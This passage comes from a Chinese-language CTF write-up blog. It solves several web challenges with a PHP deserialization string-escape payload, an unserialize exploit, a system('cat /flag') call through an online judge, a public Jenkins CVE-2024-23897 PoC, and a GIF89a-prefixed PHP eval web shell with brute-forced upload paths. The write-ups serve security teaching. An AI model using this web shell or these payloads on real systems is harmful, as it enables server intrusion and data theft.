class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	很明显当<code>Orz</code>类中的<code>Sword_Owner</code>的值为<code>DuguQiubai</code>时即可获取flag。</p>
<p>​	<code>move</code>参数是由我们使用GET方法传入的，受到我们控制，及类中的<code>Move</code>可控，但这并无法修改被写死的<code>Sword_Owner</code>的值。</p>
<p>​	注意到存在<code>Lonely_Nine_Swords::Make_a_Move($move)</code>这么一个方法的使用，那么他有什么用呢？</p>
<p>​	这个方法遍历传入的<code>$move</code>这个字符串的字符，如果匹配到<code>$esoterica</code>这个数组中的”键”，就会把他替换成”值”，例如题目中<code>di_yi_shi</code>这个”键”对应着<code>Gen_Stance</code>这个”值”，倘若我们传入的字符串中存在<code>di_yi_shi</code>，那么它就会被替换为<code>Gen_Stance</code>，</p>
<p>即</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Orz&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;Move&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;di_yi_shi&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Sword_Owner&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Nobodyxxxx&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>​	会变为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Orz&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;Move&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;Gen_Stance&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Sword_Owner&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Nobodyxxxx&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>​	这就会导致<strong>字符串逃逸</strong>的问题，详细可以看看这些博客资源</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/285985.html">PHP反序列化字符逃逸详解 - FreeBuf网络安全行业门户</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13338789.html">PHP反序列化字符逃逸 - NPFS - 博客园</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9895?time__1311=n4+xnD0DuDRD9B7NDsAoxCwRhiG80iD0OuBbD">通过CTF题目学习反序列化字符串逃逸 - 先知社区</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/duskto/articles/18185556">字符串逃逸 - duskto - 博客园</a></p>
</li>
</ul>
<p>​	我们最终需要从这样的字符串：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Orz&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;Move&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;BR&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Sword_Owner&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Nobodyxxxx&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>​	转变为类似这样的字符串：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Orz&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;Move&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;BR&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Sword_Owner&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;DuguQiubai&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>​	实际上php反序列化只会截取指定长度的部分，即：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Orz&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;Move&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;BR&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Sword_Owner&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Nobodyxxxx&quot;</span>;&#125;</span><br><span class="line">与</span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Orz&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;Move&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;BR&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Sword_Owner&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Nobodyxxxx&quot;</span>;&#125;aaaaaaaaa</span><br></pre></td></tr></table></figure>

<p>​	表示的含义相同，因此我们需要使得<code>Move</code>参数为<code>BR&quot;;s:11:&quot;Sword_Owner&quot;;s:10:&quot;Nobodyxxxx&quot;;&#125;</code>这样子，经过拼接就变为了：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250105000345042.png" alt="image-20250105000345042"></p>
<p>​	我们希望它读到这样形式的字符串就停止，并忽略后面的字符：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Orz&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;Move&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;BR&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Sword_Owner&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;DuguQiubai&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>​	而<code>s:42</code>则表示他还要读42个字符，”BR”只有两个字符，显然并不够，于是需要用到<strong>字符串逃逸</strong>了！</p>
<p>​	还记得刚刚提到的这个字符串吗？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Orz&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;Move&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;Gen_Stance&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;di_yi_shi&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Nobodyxxxx&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>​	本来我们之前传入的<code>di_yi_shi</code>是九个字符没错，但是<code>Gen_Stance</code>是十个字符，却仍然是<code>s:9</code>，就会导致一个字符的逃逸！</p>
<p>​	而<code>&quot;;s:11:&quot;Sword_Owner&quot;;s:10:&quot;DuguQiubai&quot;;&#125;</code>则有40个字符需要被逃逸。</p>
<p>​	简单写一个小脚本计算一下”键”与”值”的差值:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$esoterica</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;di_yi_shi&quot;</span> =&gt; <span class="string">&quot;Gen_Stance&quot;</span>, <span class="comment"># 1</span></span><br><span class="line">        <span class="string">&quot;di_er_shi&quot;</span> =&gt; <span class="string">&quot;Sword-defeating_Stance&quot;</span>, <span class="comment"># 13</span></span><br><span class="line">        <span class="string">&quot;di_san_shi&quot;</span> =&gt; <span class="string">&quot;Saber-defeating_Stance&quot;</span>, <span class="comment"># 12</span></span><br><span class="line">        <span class="string">&quot;di_si_shi&quot;</span> =&gt; <span class="string">&quot;Spear-defeating_Stance&quot;</span>, <span class="comment"># 13</span></span><br><span class="line">        <span class="string">&quot;di_wu_shi&quot;</span> =&gt; <span class="string">&quot;Whip-defeating_Stance&quot;</span>, <span class="comment"># 12</span></span><br><span class="line">        <span class="string">&quot;di_liu_shi&quot;</span> =&gt; <span class="string">&quot;Chain_whip-defeating_Stance&quot;</span>, <span class="comment"># 17</span></span><br><span class="line">        <span class="string">&quot;di_qi_shi&quot;</span> =&gt; <span class="string">&quot;Palm-defeating_Stance&quot;</span>, <span class="comment"># 12</span></span><br><span class="line">        <span class="string">&quot;di_ba_shi&quot;</span> =&gt; <span class="string">&quot;Arrow-defeating_Stance&quot;</span>, <span class="comment"># 13</span></span><br><span class="line">        <span class="string">&quot;di_jiu_shi&quot;</span> =&gt; <span class="string">&quot;Qi-defeating_Stance&quot;</span>  <span class="comment"># 9</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$esoterica</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>)-<span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250105001349226.png" alt="image-20250105001349226"></p>
<p>​	即这几个键值的替换依次会造成<code>1 13 12 13 12 17 12 13 9</code>的逃逸。</p>
<p>​	由<code>1+13+17+9=40</code>可知，选择第一、二、六、九式即可。</p>
<p>​	最终payload为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?move=BRdi_yi_shidi_er_shidi_liu_shidi_jiu_shi&quot;;s:11:&quot;Sword_Owner&quot;;s:10:&quot;DuguQiubai&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250105001832433.png" alt="image-20250105001832433"></p>
<h3 id="unser"><a href="#unser" class="headerlink" title="unser"></a>unser</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>Echo</br><br><b style="color:cyan;">	难度: </b>入门</br></p>
<p>​	小李是一位初学编程的小伙子，刚接触一种新语言。他发现这门语言操作数据的方式很特别，可以把复杂的信息转化为看似简单的文本，又能轻松恢复成原来的样子。</p>
<p>​	为了练习，他写了一个小程序，记录好友的名字和生日。小李把这些信息转换成一个奇怪的格式保存起来。几天后，他用程序还原了这些数据，发现好友的生日一条不少。他很开心，觉得自己迈出了学习的第一步。</p>
<p>​	这次成功让小李充满信心，他开始觉得学编程并没有想象中那么难嘛！</p>
<p><strong>题解</strong></p>
<p>​	题目给出源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user==<span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;pass==<span class="string">&quot;admin123&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">login</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	非常基础的php序列化与反序列化题目，直接给出EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">login</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;user=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;pass=<span class="string">&quot;admin123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment"># O:5:&quot;login&quot;:2:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:8:&quot;admin123&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20241222030936320.png" alt="image-20241222030936320"></p>
<h3 id="重生之我在CTF里打ACM"><a href="#重生之我在CTF里打ACM" class="headerlink" title="重生之我在CTF里打ACM"></a>重生之我在CTF里打ACM</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>BR</br><br>    <b style="color:cyan;">难度: </b>简单</br></p>
<p>​	“上一世，我因为熬夜打Codeforces没做出签到题而被活活气死，这一世我重生归来发现全球acm水平下降一万倍！！我随手一写的冒泡排序就让一众world-final金牌选手叹为观止！！！这次我定将一雪前耻！”</p>
<p>​	“握草，这咋是CTF？？？”</p>
<p><strong>题解</strong></p>
<p>​	进入题目，是一个在线测评系统：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116234542398.png" alt="image-20250116234542398"></p>
<p>​	先正常操作一下，写一个简单的c语言代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a+b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	很遗憾，没有通过：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250117000120074.png" alt="image-20250117000120074"></p>
<p>​	访问&#x2F;tip可以获取到代码执行结果：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250117000157023.png" alt="image-20250117000157023"></p>
<p>​	全部WA掉了，看来是高精度，网上随便找个高精度加法代码就行。</p>
<p>​	但是这里不是ACM，即使AC了该题也并不能获得flag！</p>
<p>​	注意到我们可以输入执行任意C&#x2F;C++代码，同时可以得到命令执行的结果，于是我们直接执行系统命令即可！</p>
<p>​	执行代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250117001645435.png" alt="image-20250117001645435"></p>
<p>​	访问<code>/tip</code>路由：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250117001727231.png" alt="image-20250117001727231"></p>
<h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>BR</br><br>    <b style="color:cyan;">难度: </b>普通</br></p>
<p>​	坏了，我不会java，这怎么打？？？</p>
<p><strong>题解</strong></p>
<p>​	Jenkins是开源的,使用Java编写的持续集成的工具。</p>
<p>​	不会java没关系，直接搜现成CVE直接打就行。<img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116221655827.png" alt="image-20250116221655827"></p>
<p>​	进入登录界面：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116232710660.png" alt="image-20250116232710660"></p>
<p>​	结合题目名字CVE，直接搜索关键词<code>Jenkins</code> <code>CVE</code>：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116232856913.png" alt="image-20250116232856913"></p>
<p>​	可以看到存在<code>CVE-2024-23897</code></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/neopoints/391038.html">	Jenkins RCE漏洞PoC发布，CVE-2024-23897漏洞解析 - FreeBuf网络安全行业门户</a></p>
<p>​	在github搜索<code>CVE-2024-23897</code>：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116233100057.png" alt="image-20250116233100057"></p>
<p>​	<img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116234253497.png" alt="image-20250116234253497"></p>
<p>​	<a target="_blank" rel="noopener" href="https://github.com/godylockz/CVE-2024-23897">godylockz&#x2F;CVE-2024-23897: POC for CVE-2024-23897 Jenkins File-Read</a></p>
<p>​	下载poc脚本运行：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116234230527.png" alt="image-20250116234230527"></p>
<p>​	更多原理可自行查阅相关博客。</p>
<h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>BR</br><br>    <b style="color:cyan;">难度: </b>普通</br></p>
<p>​	“找不到上传的文件在哪不就没有文件上传漏洞了吗！”    —-BR过于自信的说到</p>
<p>​	这次粗心的BR似乎在出完题后忘记删除掉某些东西了</p>
<p><strong>题解</strong></p>
<p>​	随便尝试上传一个文件，提示：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116145048502.png" alt="image-20250116145048502"></p>
<p>​	正常上传一个图片，可以成功上传，但是不知道上传的文件路径：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116145142418.png" alt="image-20250116145142418"></p>
<p>​	查看根路由源码，存在提示：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116145234893.png" alt="image-20250116145234893"></p>
<p>​	或许泄露了备份源码信息，使用<code>ihoneyBakFileScan_Modify</code>扫描一下看看：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116145852805.png" alt="image-20250116145852805"></p>
<p>​	<code>dirsearch</code>亦可：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116152014634.png" alt="image-20250116152014634"></p>
<p>​	存在<a href="http://www.zip文件，下载下来解压即为源码：">www.zip文件，下载下来解压即为源码：</a></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116150021244.png" alt="image-20250116150021244"></p>
<p>​	查看<code>upload.php</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$originalName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$nameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$originalName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fileExtension</span> = <span class="keyword">isset</span>(<span class="variable">$nameParts</span>[<span class="number">1</span>]) ? <span class="variable">$nameParts</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$nameParts</span>) - <span class="number">1</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$randomNumber</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="variable">$hashedFolderName</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$randomNumber</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$folderPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$hashedFolderName</span> . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$folderPath</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$folderPath</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploadFile</span> = <span class="variable">$folderPath</span> . <span class="variable">$originalName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadFile</span>)) &#123;</span><br><span class="line">        <span class="variable">$fileInfo</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$uploadFile</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$fileInfo</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$uploadFile</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Upload failed: File is not a valid image.&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File successfully uploaded.But I won&#x27;t tell you where the file was uploaded!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File upload failed.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	简单阅读代码，可以看到，程序仅接收图片类型的文件，并且生成一个文件夹（随机取一个0-100之间的整数将其进行两次MD5运算，将其作为该文件夹的名字），将上传的文件放置在该文件夹中。</p>
<p>​	针对 程序仅接收图片类型的文件 这一点，后端是对文件内容进行校验的，只需要在木马文件最开始加上<code>GIF89a</code>(这是GIF文件的文件头)即可绕过，编写的木马文件为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	保存为<code>shell.php</code>，上传。</p>
<p>​	成功上传，按照源码，此时的木马文件应该位于<code>/uploads/?????/shell.php</code>，中间文件夹的名字因为是随机生成的，每次并不相同，好在范围比较小，可以进行爆破。</p>
<p>​	此处使用BurpSuite进行爆破，使用python编写脚本亦可。</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116151238976.png" alt="image-20250116151238976"></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116151347999.png" alt="image-20250116151347999"></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116151508388.png" alt="image-20250116151508388"></p>
<p>​	可以看到<code>/uploads/3d2f8900f2e49c02b481c2f717aa9020/shell.php</code>的响应结果和其他的不同，成功爆破出上传路径。</p>
<p>​	直接读取flag：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116151917092.png" alt="image-20250116151917092"></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="FlagChecker"><a href="#FlagChecker" class="headerlink" title="FlagChecker"></a>FlagChecker</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>D3f4ult</br><br><b style="color:cyan;">	难度: </b>困难</br></p>
<p>​	D3f4ult想到了一个flag，你猜对了就告诉你。</p>
<p>​	Tips：得到的字符串包裹上flag{}</p>
<p><strong>题解</strong></p>
<p>​	需要题解联系D3f4ult</p>
<h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>BR</br><br>    <b style="color:cyan;">难度: </b>普通</br></p>
<p>​	走迷宫，这还不简简单单有手就行</p>
<p>​	PS：flag为迷宫从起点到终点的最短路径，执行附件给出的程序使其输出”you win!!!”，则表示该解正确，将该解用XAUTCTF{}包裹，示例flag：XAUTCTF{WWWASSDDD}</p>
<p><strong>题解</strong></p>
<p>​	下载附件，先尝试执行一下：</p>
